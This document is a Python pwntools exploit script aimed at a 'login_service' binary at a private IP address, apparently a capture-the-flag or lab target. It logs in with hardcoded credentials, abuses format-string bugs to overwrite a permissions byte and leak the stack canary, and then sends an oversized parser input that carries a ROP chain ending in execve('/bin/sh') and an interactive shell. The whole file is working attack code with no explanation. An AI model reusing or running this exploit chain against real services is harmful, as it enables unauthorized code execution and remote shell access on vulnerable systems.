from pwn import *
from struct import pack

def GetRopChain():
	p = lambda x : pack('I', x)

	IMAGE_BASE_0 = 0x08048000 # login_service
	rebase_0 = lambda x : p(x + IMAGE_BASE_0)

	rop = ''

	rop += rebase_0(0x000c7926) # 0x0810f926: pop eax; ret; 
	rop += '//bi'
	rop += rebase_0(0x0003fae2) # 0x08087ae2: pop edx; ret; 
	rop += rebase_0(0x1d741c)
	rop += rebase_0(0x00044988) # 0x0808c988: mov dword ptr [edx], eax; ret; 
	rop += rebase_0(0x000c7926) # 0x0810f926: pop eax; ret; 
	rop += 'n/sh'
	rop += rebase_0(0x0003fae2) # 0x08087ae2: pop edx; ret; 
	rop += rebase_0(0x1d7420)
	rop += rebase_0(0x00044988) # 0x0808c988: mov dword ptr [edx], eax; ret; 
	rop += rebase_0(0x00010780) # 0x08058780: xor eax, eax; ret; 
	rop += rebase_0(0x0003fae2) # 0x08087ae2: pop edx; ret; 
	rop += rebase_0(0x1d7424)
	rop += rebase_0(0x00044988) # 0x0808c988: mov dword ptr [edx], eax; ret; 
	rop += rebase_0(0x00000206) # 0x08048206: pop ebx; ret; 
	rop += rebase_0(0x1d741c)
	rop += rebase_0(0x00011aa7) # 0x08059aa7: pop ecx; ret; 
	rop += rebase_0(0x1d7424)
	rop += rebase_0(0x0003fae2) # 0x08087ae2: pop edx; ret; 
	rop += rebase_0(0x1d7424)
	rop += rebase_0(0x000c7926) # 0x0810f926: pop eax; ret; 
	rop += p(0xfffffff5)
	rop += rebase_0(0x000f69e7) # 0x0813e9e7: neg eax; ret; 
	rop += rebase_0(0x00118130) # 0x08160130: int 0x80; ret; 

	
	return rop


def getCanary( proc ):
	#gdb.attach( proc )

	p.send( "4\n" )
	p.recvuntil( "Write new description: " )
	p.send("%27$x\	n")
	p.recvuntil( "New description is: " )

	canary = p.recvline().strip()[:8]
	canary = int( canary, 16 )

	return canary


login = 'test'
password = 'rainbow'

p = remote("10.0.0.102", 5353)

p.recvuntil( "Username: " )
p.send( login + "\n" )
p.recvuntil( "password: " )
p.send( password + "\n" )

p.recvuntil( ">>> " )
p.sendline( "1337" )


p.recvuntil( " desc = " )
permissionsAddr = int( p.recvline(), 16 ) + 64

p.recvuntil( ">>> ")
p.sendline( "4" )
p.recvuntil( "Write new description: " )

buf = struct.pack( "<L", permissionsAddr ) + " %11$hhn"
p.sendline( buf )
p.recvuntil( ">>> " )

canary = getCanary( p )
print "canary = %x" % canary

p.recvuntil( ">>> ")
p.send( "5\n" )

print p.recvline()
print p.recvline()

buf  = ".hdr\n\t$exec\n\t$nta\n_hdr\n.code\n\tNOP\n_code\n.data\n"
buf += 'test "' + "a" * 256 + pack( "<L", canary ) + "\x90"*12
buf += GetRopChain()
buf += '" '
buf += str( 256 + 4 + 12 + len( GetRopChain() ) ) 
buf += 'b\n_data\nfini\n'

p.send( buf )

print p.recvuntil(">>> ")
#gdb.attach( p )
p.send( "6\n" )

p.recvuntil("[+] Parser done!\n")

p.interactive()

#canary = getCanary( p )

#print "canary = %x" % canary
#print p.recvuntil( ">>> " )

#gdb.attach( p )
#p.send( "6\n" )

#print p.recvuntil( ">>> " )
#p.interactive()